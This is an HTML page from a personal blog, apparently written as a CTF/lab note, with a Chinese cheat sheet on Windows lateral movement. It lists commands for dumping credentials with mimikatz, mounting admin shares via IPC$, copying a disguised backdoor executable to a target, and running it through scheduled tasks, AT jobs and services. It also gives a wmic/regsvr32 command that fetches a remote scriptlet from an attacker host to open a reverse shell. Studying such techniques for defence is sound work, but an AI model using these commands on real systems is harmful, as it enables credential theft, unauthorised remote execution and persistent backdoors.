@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blueinyou.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="利用Windows内置工具 IPC+Schtasks+AT IPC+SC(服务) WMIC(查询信息，补丁、账号；进程创建) WinRM服务  IPC$ IPC$,Internet Process Connection，是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道， 输入可信用户名、密码建立管道，借助该管道，可以实现加密数据的交换，访问远程计算机。  利用IPC$,需要使用Adm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="Paul C&#39;s Blog">
+<meta property="og:description" content="利用Windows内置工具 IPC+Schtasks+AT IPC+SC(服务) WMIC(查询信息，补丁、账号；进程创建) WinRM服务  IPC$ IPC$,Internet Process Connection，是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道， 输入可信用户名、密码建立管道，借助该管道，可以实现加密数据的交换，访问远程计算机。  利用IPC$,需要使用Adm">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667886774960.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891124571.png">
+<meta property="og:image" content="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891456404.png">
+<meta property="article:published_time" content="2022-11-07T06:19:49.000Z">
+<meta property="article:modified_time" content="2022-11-08T08:00:23.494Z">
+<meta property="article:author" content="Paul C">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667886774960.png">
+
+<link rel="canonical" href="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>横向移动 | Paul C's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Paul C's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">To be funny,to grow up!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          横向移动
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-07 14:19:49" itemprop="dateCreated datePublished" datetime="2022-11-07T14:19:49+08:00">2022-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-11-08 16:00:23" itemprop="dateModified" datetime="2022-11-08T16:00:23+08:00">2022-11-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="利用Windows内置工具"><a href="#利用Windows内置工具" class="headerlink" title="利用Windows内置工具"></a>利用Windows内置工具</h2><ul>
+<li>IPC+Schtasks+AT</li>
+<li>IPC+SC(服务)</li>
+<li>WMIC(查询信息，补丁、账号；进程创建)</li>
+<li>WinRM服务</li>
+</ul>
+<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><blockquote>
+<p>IPC$,Internet Process Connection，是共享“命名管道”的资源，它是为了<strong>让进程间通信</strong>而开放的命名管道， 输入<strong>可信</strong>用户名、密码建立管道，借助该管道，可以实现加密数据的交换，访问远程计算机。</p>
+</blockquote>
+<p>利用IPC$,需要使用Administrator账号权限。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.开放了139、445端口</p>
+<p>2.目标机器开启IPC$文件共享服务（该服务建立的初衷是为了管理员方便的管理远程计算机）。</p>
+<p>3.需要目标机器的管理员账号和密码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Documents</span>&gt;<span class="title">netstat</span> -<span class="title">ano</span>|<span class="title">findstr</span> 445</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:445            0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    192.168.66.1:54207     192.168.66.131:445     <span class="title">ESTABLISHED</span>     4</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    [::]:445               [::]:0                 <span class="title">LISTENING</span>       4</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取管理员账号密码："><a href="#获取管理员账号密码：" class="headerlink" title="获取管理员账号密码："></a>获取管理员账号密码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump密码凭据获取</span><br><span class="line">去cmd5.com在线解密即可</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">load mimikatz</span><br><span class="line">help</span><br><span class="line">#获取明文密码</span><br><span class="line">cred_kerberos</span><br></pre></td></tr></table></figure>
+<p>当无法获取到明文密码时，可以采取<strong>哈希扩展攻击</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">存放在某个文件；</span><br><span class="line">使用弱口令、口令复用；</span><br></pre></td></tr></table></figure>
+<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667886774960.png" alt="1667886774960"></p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net use  \\192.168.66.131\ipc$ /user:administrator &quot;passwd&quot;</span><br><span class="line">#该命令可能被对方防火墙拦下，报告系统错误67 找不到网络名</span><br><span class="line">#查看链接情况</span><br><span class="line">net use  </span><br><span class="line">#查看目标主机时间</span><br><span class="line">net time \\192.168.66.131 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#删除链接,并且在非交互模式下输入yes</span><br><span class="line">net use \\192.168.66.131\ipc$ /del /y</span><br><span class="line">net use * /del /y</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对于同一个机器，只能对目标主机<strong>建立一个net use链接</strong>，建立第二个时会报错（报告账号或者密码错误）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#文件上传下载</span><br><span class="line">copy shell.exe \\192.168.66.131\c$\windows\temp\plugin_uddate.exe</span><br><span class="line">#查看目标机器中的文件</span><br><span class="line">dir \\192.168.66.131\d$</span><br><span class="line"></span><br><span class="line">copy \\192.168.66.131\d$\hello.exe d:\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 改变代码页编码为utf-8，gbk 936</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">#谷歌浏览器快速切换标签页</span><br><span class="line">ctrl+shift+tab</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h2><h3 id="创建计划任务执行我的后门"><a href="#创建计划任务执行我的后门" class="headerlink" title="创建计划任务执行我的后门"></a>创建计划任务执行我的后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.66.131 /u administrator /p &quot;passwd&quot; /sc MINUTE /mo 1 /tn test /tr &quot;c:\\windows\\temp\\plugin_uddate.exe&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891124571.png" alt="1667891124571"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCCESS: The scheduled task &quot;test&quot; has successfully been created.</span><br></pre></td></tr></table></figure>
+<p>正常，过一分钟后木马被执行</p>
+<p>账户输错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: No mapping between account names and security IDs was done.</span><br><span class="line">(43,4):LogonType:</span><br></pre></td></tr></table></figure>
+<p><strong>注：只要执行了计划任务，一定会被系统日志记录下来。</strong></p>
+<h3 id="tasklist查看目标机器上的进程"><a href="#tasklist查看目标机器上的进程" class="headerlink" title="tasklist查看目标机器上的进程"></a>tasklist查看目标机器上的进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#展示详细信息</span><br><span class="line">tasklist /s \\192.168.66.131 /v  </span><br><span class="line">tasklist /s \\192.168.66.131 /u administrator /p &quot;passwd&quot;</span><br><span class="line">vm3dservice.exe</span><br><span class="line">VGAuthService</span><br></pre></td></tr></table></figure>
+<h3 id="删除指定名称的计划任务"><a href="#删除指定名称的计划任务" class="headerlink" title="删除指定名称的计划任务"></a>删除指定名称的计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">66</span>.<span class="number">131</span> /tn test /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
+<h2 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h2><h3 id="指定时间创建计划任务"><a href="#指定时间创建计划任务" class="headerlink" title="指定时间创建计划任务"></a>指定时间创建计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.66.131 </span><br><span class="line">at  \\192.168.66.131 15:08 D:\\hello.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The AT command has been deprecated. Please use schtasks.exe instead.</span><br><span class="line">Added a new job with job ID = 1</span><br></pre></td></tr></table></figure>
+<p><strong>注：At在Windows Server 2012等新版系统中被弃用</strong></p>
+<p><img src="/categories/CTF/Pe-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1667891456404.png" alt="1667891456404"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.66.131 /tn At1 /u administrator /p &quot;passwd&quot; /y</span><br></pre></td></tr></table></figure>
+<h2 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h2><h3 id="创建服务执行"><a href="#创建服务执行" class="headerlink" title="创建服务执行"></a>创建服务执行</h3><p><strong>注：binpath= 后面必须有空格</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 create test binpath= &quot;D:\\hello.exe&quot; obj= &quot;Administrator&quot; password= passwd </span><br><span class="line">sc \\192.168.66.131 start test</span><br></pre></td></tr></table></figure>
+<h3 id="查看服务是否创建成功"><a href="#查看服务是否创建成功" class="headerlink" title="查看服务是否创建成功"></a>查看服务是否创建成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.68.66.131 qc test</span><br></pre></td></tr></table></figure>
+<h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p> Windows Management Instrumentation </p>
+<h3 id="管理远程计算机node的进程process"><a href="#管理远程计算机node的进程process" class="headerlink" title="管理远程计算机node的进程process"></a>管理远程计算机node的进程process</h3><p>借助regsvr32,进而反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.66.131 /user:administrator /password:passwd process call create &quot;regsvr32&quot; /s /n /u /i:http:192.168.66.1:8080/fesddasji.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
+<p>注：wmic没有回显，可以借助wmicexec.vbs脚本实现回显。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#列出简洁的系统信息</span><br><span class="line">wmic os list brief</span><br></pre></td></tr></table></figure>
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jobs</span><br><span class="line">#获取建立的会话</span><br><span class="line">sessions</span><br><span class="line"># 选择一个会话</span><br><span class="line">sessions 5</span><br><span class="line">#获取用户名</span><br><span class="line">meterpreter:getuid</span><br><span class="line">#退出当前会话</span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/categories/Linux/Ubuntu22%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="prev" title="Ubuntu22虚拟机安装">
+      <i class="fa fa-chevron-left"></i> Ubuntu22虚拟机安装
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Windows%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7"><span class="nav-number">1.</span> <span class="nav-text">利用Windows内置工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPC"><span class="nav-number">2.</span> <span class="nav-text">IPC$</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">获取管理员账号密码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">2.3.</span> <span class="nav-text">常用命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Schtasks"><span class="nav-number">3.</span> <span class="nav-text">Schtasks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E6%88%91%E7%9A%84%E5%90%8E%E9%97%A8"><span class="nav-number">3.1.</span> <span class="nav-text">创建计划任务执行我的后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tasklist%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">tasklist查看目标机器上的进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%8C%87%E5%AE%9A%E5%90%8D%E7%A7%B0%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">3.3.</span> <span class="nav-text">删除指定名称的计划任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AT"><span class="nav-number">4.</span> <span class="nav-text">AT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E6%97%B6%E9%97%B4%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.1.</span> <span class="nav-text">指定时间创建计划任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SC"><span class="nav-number">5.</span> <span class="nav-text">SC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E6%89%A7%E8%A1%8C"><span class="nav-number">5.1.</span> <span class="nav-text">创建服务执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E6%98%AF%E5%90%A6%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F"><span class="nav-number">5.2.</span> <span class="nav-text">查看服务是否创建成功</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMIC"><span class="nav-number">6.</span> <span class="nav-text">WMIC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E8%BF%9C%E7%A8%8B%E8%AE%A1%E7%AE%97%E6%9C%BAnode%E7%9A%84%E8%BF%9B%E7%A8%8Bprocess"><span class="nav-number">6.1.</span> <span class="nav-text">管理远程计算机node的进程process</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSF"><span class="nav-number">7.</span> <span class="nav-text">MSF</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paul C"
+      src="https://blueinyou.com/photos/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Paul C</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/memoryofsnow" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;memoryofsnow" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2215489940@qq.com" title="E-Mail → mailto:2215489940@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jiyi_guoshu" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jiyi_guoshu" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paul C</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
